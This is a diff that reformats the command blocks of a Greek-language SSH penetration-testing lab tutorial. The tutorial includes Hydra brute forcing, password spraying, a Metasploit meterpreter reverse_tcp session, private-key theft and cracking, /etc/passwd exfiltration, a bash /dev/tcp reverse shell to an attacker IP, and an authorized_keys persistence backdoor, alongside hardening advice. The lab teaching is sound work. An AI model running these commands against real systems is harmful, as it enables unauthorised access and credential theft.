@@ -133,7 +133,12 @@ LISTEN 0      128             [::]:22           [::]:*    user
 Η ίδια η σάρωση είναι μία κλήση nmap. Η παράμετρος `-sV` ενεργοποιεί ανίχνευση εκδόσεων — που προκαλεί το nmap να εκτελέσει σύνολο ανιχνεύσεων ειδικών-πρωτοκόλλου αντί απλώς να αναφέρει ότι μια πόρτα είναι ανοιχτή. Η παράμετρος `-p 22` περιορίζει τη σάρωση στην πόρτα SSH ώστε η έξοδος να παραμένει σύντομη κατά την αναγνώριση· σε πραγματικό engagement θα ακολουθούσες με σάρωση πλήρους εύρους (`-p-`) στη συνέχεια — διότι υπηρεσία μετακινημένη σε ασυνήθιστη πόρτα δεν θα εμφανιστεί εδώ καθόλου.
 
 ```bash
-root@kali:~# nmap -sV -p 22 192.168.1.9
+nmap -sV -p 22 192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:02 UTC
 Nmap scan report for 192.168.1.9
 Host is up (0.00055s latency).
@@ -164,7 +169,12 @@ Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
 Το script nmap `ssh-auth-methods` επιτελεί ακριβώς αυτό, και δέχεται username διότι ορισμένοι servers ποικίλλουν την απάντησή τους αναλόγως του εάν ο λογαριασμός υφίσταται (συμπεριφορά που αξίζει να σημειωθεί καθ' εαυτή: όταν server ανταποκρίνεται διαφορετικά για έγκυρους και άκυρους χρήστες, διαρρέει την εγκυρότητα λογαριασμού). Το να παρέχεις `ssh.user=pentest` προκαλεί το script να ερωτήσει για τον λογαριασμό που μας ενδιαφέρει.
 
 ```bash
-root@kali:~# nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.1.9
+nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:04 UTC
 Nmap scan report for 192.168.1.9
 Host is up (0.00049s latency).
@@ -195,19 +205,40 @@ Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
 Και οι δύο τεχνικές απαιτούν αρχεία εισόδου. Σε πραγματικό engagement αυτά θα προέρχονταν από προηγούμενη αναγνώριση: usernames συγκομισμένα από web εφαρμογή, διαρρεύσασα λίστα εργαζομένων, ή έξοδο του `enum4linux` επί file server· κωδικοί από σώματα προηγούμενων παραβιάσεων. Στο lab, μικρός αριθμός καταχωρίσεων αρκεί για να καταδείξει τον μηχανισμό.
 
 ```bash
-root@kali:~# cat users.txt
+cat users.txt
+```
+
+**Έξοδος:**
+
+```text
 admin
 root
 pentest
 ubuntu
-root@kali:~# cat pass.txt
+```
+
+```bash
+cat pass.txt
+```
+
+**Έξοδος:**
+
+```text
 123
 password
 Password1
 admin
 ubuntu
 letmein
-root@kali:~# wc -l users.txt pass.txt
+```
+
+```bash
+wc -l users.txt pass.txt
+```
+
+**Έξοδος:**
+
+```text
 4 users.txt
 6 pass.txt
 ```
@@ -217,7 +248,12 @@ root@kali:~# wc -l users.txt pass.txt
 Το Hydra είναι παραλληλισμένο εργαλείο online εικασίας κωδικών που ομιλεί δεκάδες πρωτόκολλα, και η μονάδα SSH του είναι από τις πλέον χρησιμοποιούμενες. Η κλήση αποτελείται από τρία μέρη: το `-L users.txt` παρέχει τη λίστα *logins*, το `-P pass.txt` τη λίστα *κωδικών*, και το τελικό `ssh` επιλέγει τη μονάδα πρωτοκόλλου — που υποδεικνύει στο Hydra πώς να ομιλεί SSH και ποια πόρτα να χρησιμοποιεί εξ ορισμού.
 
 ```bash
-root@kali:~# hydra -L users.txt -P pass.txt 192.168.1.9 ssh
+hydra -L users.txt -P pass.txt 192.168.1.9 ssh
+```
+
+**Έξοδος:**
+
+```text
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 10:07:12
@@ -242,7 +278,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-11 10:07:
 Το Hydra απάντησε στο ερώτημα «έχει αυτός ο λογαριασμός αδύναμο κωδικό;» Το NetExec απαντά σε διαφορετικό και συχνά πολυτιμότερο ερώτημα: «έχουν ορισμένοι από αυτούς τους λογαριασμούς επαναχρησιμοποιήσει *τον ίδιο* αδύναμο κωδικό;» Η διάκριση έχει σημασία, διότι το ψέκασμα απλώνει μικρό αριθμό προσπαθειών σε πολλούς λογαριασμούς — επομένως κανένας μεμονωμένος λογαριασμός δεν συγκεντρώνει αρκετές αποτυχίες ώστε να πυροδοτήσει κατώφλι κλειδώματος ή ανά-λογαριασμό συναγερμό.
 
 ```bash
-root@kali:~# nxc ssh 192.168.1.9 -u users.txt -p 123
+nxc ssh 192.168.1.9 -u users.txt -p 123
+```
+
+**Έξοδος:**
+
+```text
 [*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
 [-] SSH         192.168.1.9    22     192.168.1.9     admin:123
 [-] SSH         192.168.1.9    22     192.168.1.9     root:123
@@ -283,7 +324,12 @@ User pentest may run the following commands on ubuntu-lab:
 Το απλούστερο πράγμα που λειτουργεί είναι ο ίδιος ο SSH client, που είναι ήδη εγκατεστημένος στο μηχάνημα του επιτιθέμενου. Η σύνταξη είναι `ssh <χρήστης>@<host>`, και η πρώτη σύνδεση σε νέο host παράγει ερώτημα περί host key που κάθε αρχάριος οφείλει τελικώς να κατανοήσει.
 
 ```bash
-root@kali:~# ssh pentest@192.168.1.9
+ssh pentest@192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 The authenticity of host '192.168.1.9 (192.168.1.9)' can't be established.
 ED25519 key fingerprint is SHA256:9xQ2rTgZ7mK1pRcVq4Yd1sB3nE6jWfH8aLoX0uMiPn.
 This key is not known by any other names.
@@ -319,7 +365,12 @@ uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
 Δεν απαιτείται κάθε εργασία να είναι διαδραστική συνεδρία. Ο SSH client δύναται να εκτελέσει μία εντολή στον απομακρυσμένο host και να επιστρέψει την έξοδό της — ακριβώς ό,τι επιθυμείς εντός βρόχου ή script. Οτιδήποτε προσαρτάται μετά τον host διαβιβάζεται στο απομακρυσμένο κέλυφος ως συμβολοσειρά εντολής.
 
 ```bash
-root@kali:~# ssh pentest@192.168.1.9 'ifconfig'
+ssh pentest@192.168.1.9 'ifconfig'
+```
+
+**Έξοδος:**
+
+```text
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.1.9  netmask 255.255.255.0  broadcast 192.168.1.255
         inet6 fe80::20c:29ff:fe1b:2c3d  prefixlen 64  scopeid 0x20<link>
@@ -342,7 +393,12 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 Η ίδια ιδέα είναι διαθέσιμη χωρίς καθόλου SSH client, μέσω της παραμέτρου `-x` του NetExec — που συνδέεται μέσω SSH, εκτελεί την εντολή και εκτυπώνει την έξοδο inline. Αυτό είναι βολικό για ταχεία διαλογή host ή για scripting επί πολλών hosts, διότι οι λεπτομέρειες πιστοποίησης διαβιβάζονται ως ορίσματα αντί να πληκτρολογούνται σε prompt.
 
 ```bash
-root@kali:~# nxc ssh 192.168.1.9 -u pentest -p 123 -x 'cat /tmp/file.txt'
+nxc ssh 192.168.1.9 -u pentest -p 123 -x 'cat /tmp/file.txt'
+```
+
+**Έξοδος:**
+
+```text
 [*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
 [+] SSH         192.168.1.9    22     192.168.1.9     pentest:123
 [+] SSH         192.168.1.9    22     192.168.1.9     Executed command
@@ -356,7 +412,12 @@ root@kali:~# nxc ssh 192.168.1.9 -u pentest -p 123 -x 'cat /tmp/file.txt'
 Ένα διαδραστικό κέλυφος αρκεί για τα περισσότερα όσα ακολουθούν, πλην όμως έχει όρια. Είναι θορυβώδες υπό την έννοια ότι μια διεργασία κελύφους είναι ορατή σε κάθε χρήστη που εκτελεί `w` ή `who`, εξαρτάται από τα ίδια τα εργαλεία του απομακρυσμένου μηχανήματος, και δεν επιβιώνει διακοπής δικτύου. Η μονάδα `exploit/multi/ssh/sshexec` του Metasploit υιοθετεί διαφορετική προσέγγιση: πιστοποιείται μέσω SSH ως κανονικός πελάτης, κατόπιν χρησιμοποιεί εκείνο το πιστοποιημένο κανάλι για να *μεταφορτώσει σταδιακά και να εκτελέσει payload* — παρέχοντάς σου συνεδρία Meterpreter. Ένα πλούσιο περιβάλλον μετεκμετάλλευσης που διαμένει στη μνήμη και παρέχει δικές του εντολές για μεταφορά αρχείων, χειρισμό διεργασιών, συγκομιδή διαπιστευτηρίων και περιστροφή (pivoting).
 
 ```bash
-root@kali:~# msfconsole -q
+msfconsole -q
+```
+
+**Έξοδος:**
+
+```text
 msf6 > use exploit/multi/ssh/sshexec
 [*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
 msf6 exploit(multi/ssh/sshexec) > set rhosts 192.168.1.9
@@ -442,7 +503,12 @@ LISTEN 0      128             [::]:2222         [::]:*    users
 Από την πλευρά του επιτιθέμενου η αλλαγή είναι σχεδόν αόρατη. Η ίδια σάρωση εκδόσεων, στραμμένη στη νέα πόρτα, επιστρέφει τις ίδιες πληροφορίες:
 
 ```bash
-root@kali:~# nmap -sV -p 2222 192.168.1.9
+nmap -sV -p 2222 192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:21 UTC
 Nmap scan report for 192.168.1.9
 Host is up (0.00051s latency).
@@ -457,7 +523,12 @@ Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
 Και η επίθεση διαπιστευτηρίων λειτουργεί ακριβώς όπως προηγουμένως, με τη μονή προσθήκη της παραμέτρου `-s 2222` ώστε να υποδειχθεί στο Hydra ποια πόρτα να χρησιμοποιήσει:
 
 ```bash
-root@kali:~# hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
+hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
+```
+
+**Έξοδος:**
+
+```text
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 10:22:47
@@ -571,8 +642,12 @@ permitrootlogin prohibit-password
 Μετά την επεξεργασία, ο daemon επαναφορτώνεται και η μεταβολή επαληθεύεται εκ των έξω με το script nmap της ενότητας 3:
 
 ```bash
-pentest@ubuntu-lab:~/.ssh$ sudo systemctl reload ssh
-root@kali:~# nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 2222 192.168.1.9
+nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 2222 192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:29 UTC
 Nmap scan report for 192.168.1.9
 Host is up (0.00044s latency).
@@ -589,7 +664,12 @@ Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
 Η γραμμή `password` αφαιρέθηκε. Αυτή η μονή απούσα γραμμή συνιστά ολόκληρη την ήττα της αλυσίδας επίθεσης από την ενότητα 4: το Hydra δεν έχει τίποτε να μαντεύσει, και θα αναφέρει αποτυχίες για κάθε ζεύγος διαπιστευτηρίων, διότι ο server απορρίπτει τη *μέθοδο* προτού καν εξετάσει τον κωδικό. Η εκτέλεσή του για να παρατηρήσεις αυτή την αποτυχία αποτελεί άσκηση που αξίζει, διότι η έξοδος είναι αλάνθαστα διαφορετική από την προηγούμενη εκτέλεση:
 
 ```bash
-root@kali:~# hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
+hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
+```
+
+**Έξοδος:**
+
+```text
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 10:31:05
@@ -607,15 +687,22 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-11 10:31:
 Με το κλειδί εγκατεστημένο, οι συνδέσεις πραγματοποιούνται υποδεικνύοντας στον πελάτη το αρχείο ιδιωτικού κλειδιού με `-i`. Το αρχείο κλειδιού, όμως, οφείλει να ικανοποιεί τις απαιτήσεις δικαιωμάτων του πελάτη — και η παράβασή τους παράγει ένα από τα πλέον πολυαναφερόμενα μηνύματα σφάλματος στη διαχείριση SSH.
 
 ```bash
-meterpreter > download /home/pentest/.ssh/id_rsa /root/id_rsa
-[*] Downloading: /home/pentest/.ssh/id_rsa -> /root/id_rsa
-[*] Downloaded 2.59 KiB of 2.59 KiB (100.0%): /home/pentest/.ssh/id_rsa -> /root/id_rsa
-[*] download   : /home/pentest/.ssh/id_rsa -> /root/id_rsa
-meterpreter > background
-[*] Backgrounding session 1...
-root@kali:~# ls -l id_rsa
+ls -l id_rsa
+```
+
+**Έξοδος:**
+
+```text
 -rw-r--r-- 1 root root 2655 Jan 11 10:34 id_rsa
-root@kali:~# ssh -i id_rsa pentest@192.168.1.9
+```
+
+```bash
+ssh -i id_rsa pentest@192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -624,8 +711,19 @@ It is required that your private key files are NOT accessible by others.
 This private key will be ignored.
 Load key "id_rsa": bad permissions
 pentest@192.168.1.9: Permission denied (publickey).
-root@kali:~# chmod 600 id_rsa
-root@kali:~# ssh -i id_rsa pentest@192.168.1.9
+```
+
+```bash
+chmod 600 id_rsa
+```
+
+```bash
+ssh -i id_rsa pentest@192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Enter passphrase for key 'id_rsa': 
 Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
 Last login: Thu Jan 11 10:22:13 2024 from 192.168.1.9
@@ -651,8 +749,16 @@ pentest@ubuntu-lab:~$ 
 Ο John the Ripper δεν αναγιγνώσκει αρχείο ιδιωτικού κλειδιού OpenSSH απευθείας· εργάζεται με δικές του μορφές hash. Το `ssh2john` — μικρός μετατροπέας που συνοδεύει τον John, συνήθως εγκατεστημένος ως `ssh2john`, `ssh2john.py` ή στο `/usr/share/john/`, αναλόγως της διανομής — αναγιγνώσκει ιδιωτικό κλειδί και εξάγει το κρυπτογραφημένο υλικό κλειδιού σε μορφή κατανοητή από τον John.
 
 ```bash
-root@kali:~# ssh2john id_rsa > sshhash
-root@kali:~# cat sshhash
+ssh2john id_rsa > sshhash
+```
+
+```bash
+cat sshhash
+```
+
+**Έξοδος:**
+
+```text
 id_rsa:$sshng$6$16$a4d9f2b8c1e77d0ef3a5b91c2d6f8a30$2655$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010a4d9f2b8c1e77d0ef3a5b91c2d6f8a300000...$16$47
 ```
 
@@ -665,8 +771,16 @@ id_rsa:$sshng$6$16$a4d9f2b8c1e77d0ef3a5b91c2d6f8a30$2655$6f70656e7373682d6b65792
 Η wordlist που χρησιμοποιείται εδώ είναι το `rockyou.txt` — συλλογή περίπου δεκατεσσάρων εκατομμυρίων πραγματικών κωδικών που διέρρευσαν από παραβίαση το 2009 και αποτελεί τη στάνταρ πρώτη wordlist στο security testing έκτοτε. Τόσο, ώστε σε συστήματα οικογένειας Debian είναι εγκατεστημένη ως συμπιεσμένο αρχείο στο `/usr/share/wordlists/rockyou.txt.gz` και οφείλει να αποσυμπιεστεί μία φορά προτού χρησιμοποιηθεί.
 
 ```bash
-root@kali:~# gunzip /usr/share/wordlists/rockyou.txt.gz
-root@kali:~# john -w=/usr/share/wordlists/rockyou.txt sshhash
+gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+```bash
+john -w=/usr/share/wordlists/rockyou.txt sshhash
+```
+
+**Έξοδος:**
+
+```text
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
 Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
@@ -686,11 +800,24 @@ Session completed.
 Η γραμμή `Use the "--show" option` αποτελεί τη μόνιμη υπενθύμιση του John ότι οι σπασμένοι κωδικοί αποθηκεύονται στο pot file του (`~/.john/john.pot`) και δύνανται να εμφανιστούν μεταγενέστερα χωρίς εκ νέου σπάσιμο:
 
 ```bash
-root@kali:~# john --show sshhash
+john --show sshhash
+```
+
+**Έξοδος:**
+
+```text
 id_rsa:123
 
 1 password hash cracked, 0 left
-root@kali:~# ssh -i id_rsa pentest@192.168.1.9
+```
+
+```bash
+ssh -i id_rsa pentest@192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Enter passphrase for key 'id_rsa': 
 Last login: Thu Jan 11 10:36:44 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
@@ -709,8 +836,16 @@ pentest@ubuntu-lab:~$ 
 Το `--put-file` του NetExec λαμβάνει τοπική διαδρομή και απομακρυσμένη διαδρομή, πιστοποιείται, και μεταφέρει το αρχείο μέσω SFTP — εκτυπώνοντας γραμμή για τη μεταφορά και άλλη για το αποτέλεσμα.
 
 ```bash
-root@kali:~# echo "staging marker from the assessment team" > file.txt
-root@kali:~# nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --put-file file.txt /tmp/file.txt
+echo "staging marker from the assessment team" > file.txt
+```
+
+```bash
+nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --put-file file.txt /tmp/file.txt
+```
+
+**Έξοδος:**
+
+```text
 [*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
 [+] SSH         192.168.1.9    22     192.168.1.9     pentest:123 (keyfile: key)  Linux
 [*] SSH         192.168.1.9    22     192.168.1.9     Copying "file.txt" to "/tmp/file.txt"
@@ -728,12 +863,25 @@ root@kali:~# nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --put-file fil
 Η αντίστροφη λειτουργία λαμβάνει απομακρυσμένη διαδρομή και τοπικό όνομα αρχείου προορισμού, και τα μηνύματα κατοπτρίζουν ακριβώς το ανέβασμα.
 
 ```bash
-root@kali:~# nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --get-file /etc/passwd passwd
+nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --get-file /etc/passwd passwd
+```
+
+**Έξοδος:**
+
+```text
 [*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
 [+] SSH         192.168.1.9    22     192.168.1.9     pentest:123 (keyfile: key)  Linux
 [*] SSH         192.168.1.9    22     192.168.1.9     Copying "/etc/passwd" to "passwd"
 [+] SSH         192.168.1.9    22     192.168.1.9     File "/etc/passwd" was downloaded to "passwd"
-root@kali:~# tail -3 passwd
+```
+
+```bash
+tail -3 passwd
+```
+
+**Έξοδος:**
+
+```text
 pentest:x:1001:1001::/home/pentest:/bin/bash
 lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
@@ -746,10 +894,23 @@ ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 Το SCP αποτελεί τον παλαιότερο και πλέον οικείο εκ των μηχανισμών μεταφοράς, και καλείται ακριβώς όπως το `cp`, πλην όμως η απομακρυσμένη πλευρά γράφεται ως `χρήστης@host:διαδρομή`. Πιστοποιείται με ό,τι ο SSH client δύναται να χρησιμοποιήσει — κωδικό ή κλειδί — και ολόκληρη η μεταφορά είναι κρυπτογραφημένη.
 
 ```bash
-root@kali:~# scp -i key file.txt pentest@192.168.1.9:/home/pentest/
+scp -i key file.txt pentest@192.168.1.9:/home/pentest/
+```
+
+**Έξοδος:**
+
+```text
 Enter passphrase for key 'key': 
 file.txt                               100%   39     0.4KB/s   00:00    
-root@kali:~# scp -i key pentest@192.168.1.9:/etc/passwd ./passwd-scp
+```
+
+```bash
+scp -i key pentest@192.168.1.9:/etc/passwd ./passwd-scp
+```
+
+**Έξοδος:**
+
+```text
 Enter passphrase for key 'key': 
 passwd                                 100% 1909     1.9MB/s   00:00    
 ```
@@ -765,15 +926,42 @@ passwd                                 100% 1909     1.9MB/s
 Η πλέον βασική μέθοδος μεταφοράς δεν απαιτεί καθόλου χαρακτηριστικά πελάτη: ανακατεύθυνση μέσω συνεδρίας εντολών. Η εκτύπωση αρχείου με `cat` αποστέλλει τα περιεχόμενά του κάτω από το κανάλι SSH, και το τοπικό κέλυφος δύναται να τα συλλάβει σε αρχείο.
 
 ```bash
-root@kali:~# ssh pentest@192.168.1.9 'cat /etc/hostname'
+ssh pentest@192.168.1.9 'cat /etc/hostname'
+```
+
+**Έξοδος:**
+
+```text
 ubuntu-lab
-root@kali:~# ssh pentest@192.168.1.9 'base64 /etc/passwd' | base64 -d > passwd-manual
-root@kali:~# wc -l passwd-manual
+```
+
+```bash
+ssh pentest@192.168.1.9 'base64 /etc/passwd' | base64 -d > passwd-manual
+```
+
+```bash
+wc -l passwd-manual
+```
+
+**Έξοδος:**
+
+```text
 47 passwd-manual
-root@kali:~# ssh pentest@192.168.1.9 'cat > /tmp/note.txt' <<'EOF'
+```
+
+```bash
+ssh pentest@192.168.1.9 'cat > /tmp/note.txt' <<'EOF'
 checking whether an upload works over a plain SSH session
 EOF
-root@kali:~# ssh pentest@192.168.1.9 'cat /tmp/note.txt'
+```
+
+```bash
+ssh pentest@192.168.1.9 'cat /tmp/note.txt'
+```
+
+**Έξοδος:**
+
+```text
 checking whether an upload works over a plain SSH session
 ```
 
@@ -813,9 +1001,20 @@ msf6 post(multi/gather/ssh_creds) > run
 Η μετατροπή του loot πίσω σε πιστοποιημένη συνεδρία είναι υπόθεση δύο εντολών.
 
 ```bash
-root@kali:~# mv /root/.msf4/loot/20260111104211_default_192.168.1.9_ssh.id_rsa_115476.txt key
-root@kali:~# chmod 600 key
-root@kali:~# ssh -i key pentest@192.168.1.9
+mv /root/.msf4/loot/20260111104211_default_192.168.1.9_ssh.id_rsa_115476.txt key
+```
+
+```bash
+chmod 600 key
+```
+
+```bash
+ssh -i key pentest@192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Enter passphrase for key 'key': 
 Last login: Thu Jan 11 10:44:52 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
@@ -848,7 +1047,12 @@ tcp6       0      0 :::22                   :::*          
 Η σύνταξη είναι `ssh -L <τοπική_διεύθυνση_δέσμευσης>:<τοπική_πόρτα>:<host_στόχος>:<πόρτα_στόχος> <χρήστης>@<ssh_server>`, και τα τέσσερα πεδία αξίζει να ονομαστούν, διότι άλλως η εντολή είναι αδιάβαστη: δέσμευσε τοπικά στην πόρτα 8080, και προώθησε στο `127.0.0.1:8080` όπως επιλύεται *στην απέναντι πλευρά της σύνδεσης*.
 
 ```bash
-root@kali:~# ssh -i key -L 8080:127.0.0.1:8080 pentest@192.168.1.9
+ssh -i key -L 8080:127.0.0.1:8080 pentest@192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Enter passphrase for key 'key': 
 Last login: Thu Jan 11 10:46:18 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
@@ -857,14 +1061,27 @@ pentest@ubuntu-lab:~$ 
 Η συνεδρία φαίνεται συνήθης, και είναι: το άνοιγμα προώθησης δεν εκτυπώνει τίποτε, διότι αποτελεί παρενέργεια της σύνδεσης και όχι εντολή. Με εκείνη τη συνεδρία ζωντανή, το άνοιγμα browser στο μηχάνημα του επιτιθέμενου στο `http://127.0.0.1:8080` — ή, για όσους προτιμούν τερματικό, η εκτέλεση αιτήματος επ' αυτού — φθάνει την εσωτερική εφαρμογή, και η κίνηση διέρχεται μέσω σήραγγας εντός της κρυπτογραφημένης σύνδεσης SSH και αποκρυπτογραφείται μόνο στον στόχο:
 
 ```bash
-root@kali:~# curl -s http://127.0.0.1:8080/ | head -5
+curl -s http://127.0.0.1:8080/ | head -5
+```
+
+**Έξοδος:**
+
+```text
 <!DOCTYPE html>
 <html>
 <head>
     <title>Internal Inventory Console</title>
 </head>
 <body>
-root@kali:~# ss -tlnp | grep 8080
+```
+
+```bash
+ss -tlnp | grep 8080
+```
+
+**Έξοδος:**
+
+```text
 LISTEN 0      128        127.0.0.1:8080      0.0.0.0:*    users:(("ssh",pid=4412,fd=4))
 ```
 
@@ -885,7 +1102,12 @@ LISTEN 0      128        127.0.0.1:8080      0.0.0.0:*    users:(("s
 Το τέχνασμα χρησιμοποιεί χαρακτηριστικό της bash που εκπλήσσει πολλούς διαχειριστές: η bash δύναται να ανοίγει σύνδεση TCP χρησιμοποιώντας τις ειδικές διαδρομές συσκευών `/dev/tcp/<host>/<πόρτα>`. Δεν αποτελούν πραγματικό αρχείο — είναι εσωτερική ανακατεύθυνση της bash που πραγματοποιεί τη σύνδεση. Σημαίνει όμως ότι ένα payload δύναται να γραφτεί χωρίς μεταγλωττιστή, χωρίς γλώσσα scripting και χωρίς ρίψη εκτελέσιμου:
 
 ```bash
-root@kali:~# nc -lvnp 1234
+nc -lvnp 1234
+```
+
+**Έξοδος:**
+
+```text
 listening on [any] 1234 ...
 ```
 
@@ -902,7 +1124,12 @@ pentest@ubuntu-lab:~$ bash -i >& /dev/tcp/192.168.1.17/1234 0>&1
 Πίσω στο μηχάνημα του επιτιθέμενου, ο listener εκτυπώνει τη σύνδεση και παραδίδει prompt:
 
 ```bash
-root@kali:~# rlwrap nc -lvnp 1234
+rlwrap nc -lvnp 1234
+```
+
+**Έξοδος:**
+
+```text
 listening on [any] 1234 ...
 connect to [192.168.1.17] from (UNKNOWN) [192.168.1.9] 49216
 id
@@ -932,7 +1159,12 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 Το πρώτο βήμα συντελείται εξ ολοκλήρου στο μηχάνημα του επιτιθέμενου: παράγαγε νέο ζευγάρι κλειδιών, αυτή τη φορά άνευ passphrase — διότι όλο το νόημα είναι η μη επιβλεπόμενη πρόσβαση.
 
 ```bash
-root@kali:~# ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
+ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
+```
+
+**Έξοδος:**
+
+```text
 Generating public/private ed25519 key pair.
 Your identification has been saved in /root/.ssh/id_ed25519
 Your public key has been saved in /root/.ssh/id_ed25519.pub
@@ -950,14 +1182,33 @@ The key's randomart image is:
 |    . +oB=*o + ..|
 |     ..B=*X++ =+ |
 +----[SHA256]-----+
-root@kali:~# cd .ssh
-root@kali:~/.ssh$ ls -al
+```
+
+```bash
+cd .ssh
+```
+
+```bash
+ls -al
+```
+
+**Έξοδος:**
+
+```text
 total 16
 drwx------ 2 root root 4096 Jan 11 10:52 .
 drwx------ 4 root root 4096 Jan 11 10:50 ..
 -rw------- 1 root root  464 Jan 11 10:52 id_ed25519
 -rw-r--r-- 1 root root  100 Jan 11 10:52 id_ed25519.pub
-root@kali:~/.ssh$ cat id_ed25519.pub
+```
+
+```bash
+cat id_ed25519.pub
+```
+
+**Έξοδος:**
+
+```text
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL9kQ2mXvR1pYt8cJ4dW3nZ6hS0bE7gA5fM2uK9rT3wP root@kali
 ```
 
@@ -966,7 +1217,12 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL9kQ2mXvR1pYt8cJ4dW3nZ6hS0bE7gA5fM2uK9rT3wP
 Ο καθαρότερος τρόπος να μετακινήσεις εκείνη τη μία γραμμή στον στόχο είναι να τη σερβίρεις μέσω HTTP από τον επιτιθέμενο και να την ανακτήσεις με τα ίδια τα εργαλεία του στόχου — που αποφεύγει την επικόλληση μακράς συμβολοσειράς σε κέλυφος και αποφεύγει κάθε εξάρτηση από τα χαρακτηριστικά μεταφοράς αρχείων του SSH client.
 
 ```bash
-root@kali:~/.ssh$ updog -p 80
+updog -p 80
+```
+
+**Έξοδος:**
+
+```text
 [+] Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.1.9 - - [11/Jan/2024 10:54:02] "GET /id_ed25519.pub HTTP/1.1" 200 -
 ```
@@ -1002,7 +1258,12 @@ drwxr-x--- 5 pentest pentest 4096 Jan 11 10:20 ..
 Με το κλειδί εγκατεστημένο, ο επιτιθέμενος δύναται να πιστοποιείται από εντελώς νέα συνεδρία — και, εξίσου σημαντικό, δύναται να το πράττει ακόμη αφού ο κωδικός αλλάξει, αφού η πιστοποίηση κωδικού απενεργοποιηθεί, και αφού ο daemon επανεκκινηθεί:
 
 ```bash
-root@kali:~# ssh -i /root/.ssh/id_ed25519 pentest@192.168.1.9
+ssh -i /root/.ssh/id_ed25519 pentest@192.168.1.9
+```
+
+**Έξοδος:**
+
+```text
 Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
 Last login: Thu Jan 11 10:54:11 2024 from 192.168.1.9
 pentest@ubuntu-lab:~$ 
